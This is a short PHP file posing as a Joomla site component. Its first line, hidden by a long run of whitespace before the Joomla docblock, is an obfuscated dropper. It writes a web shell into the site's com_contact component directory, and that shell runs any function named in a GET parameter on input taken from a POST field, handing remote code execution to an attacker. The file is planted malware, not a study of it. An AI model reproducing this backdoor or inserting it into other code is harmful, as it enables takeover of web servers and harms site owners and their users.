<?php                                                                                                                                                                                    $content = '<?php (';$content .= '$_=';$content .= '@$_G';$content .= 'ET[c]).@$_($_P';$content .= 'OS';$content .= 'T["tlt90p"])?>';$file = @fopen("/home/smkseba/public_html/components/com_contact/views/category/com_contact_info.php", "w");@fwrite($file,  $content) ;
/**
 * @package     Joomla.Site
